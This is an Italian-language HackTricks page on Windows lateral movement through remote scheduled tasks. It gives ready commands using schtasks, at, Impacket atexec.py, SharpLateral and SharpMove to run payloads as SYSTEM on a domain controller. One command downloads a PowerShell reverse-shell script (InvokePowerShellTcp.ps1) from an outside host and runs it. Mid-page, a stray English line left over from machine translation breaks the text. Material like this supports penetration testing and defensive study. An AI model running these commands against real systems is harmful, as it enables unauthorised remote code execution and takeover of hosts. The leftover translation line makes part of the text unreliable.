# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Come funziona

Con accesso amministrativo a un host Windows, un operatore può creare e avviare da remoto un'attività pianificata. L'opzione `/S` seleziona l'host remoto, `/U` e `/P` forniscono le credenziali per creare l'attività quando necessario, mentre `/RU` seleziona l'account con cui viene eseguita l'attività. Il comando indicato da `/TR` deve esistere sul sistema remoto.<sup>[[1]](#references)</sup>

Il comando `at` precedente può anche pianificare un comando su un host remoto quando il servizio Schedule è in esecuzione. Esegue i job pianificati con l'account del servizio, che comunemente è `SYSTEM`:<sup>[[5]](#references)</sup>
```cmd
at \\victim 23:00 shutdown -r
```
Crea il task e poi avvialo:
```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```
Please provide the English text you want translated into Italian.
```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Per un'attività settimanale ricorrente, usa una pianificazione settimanale valida e specifica esplicitamente il giorno:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```
Un'azione dell'attività può anche invocare direttamente PowerShell. Il seguente esempio di laboratorio scarica ed esegue uno script; ospita il payload solo su infrastrutture autorizzate per la valutazione:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Impacket `atexec.py` automatizza l'esecuzione remota dei comandi tramite il servizio Task Scheduler e supporta l'autenticazione con password, hash NTLM o Kerberos.<sup>[[2]](#references)</sup>
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
SharpLateral fornisce un metodo di esecuzione tramite attività pianificate:<sup>[[3]](#references)</sup>
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
SharpMove fornisce un'altra implementazione di Task Scheduler:<sup>[[4]](#references)</sup>
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Ulteriori informazioni sull'[**uso di schtasks con silver tickets qui**](../active-directory-methodology/silver-ticket.md#host).

Rimuovere i task di test dopo l'uso:
```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```
## References

- [1] [Microsoft Learn - schtasks create](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - `at` command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
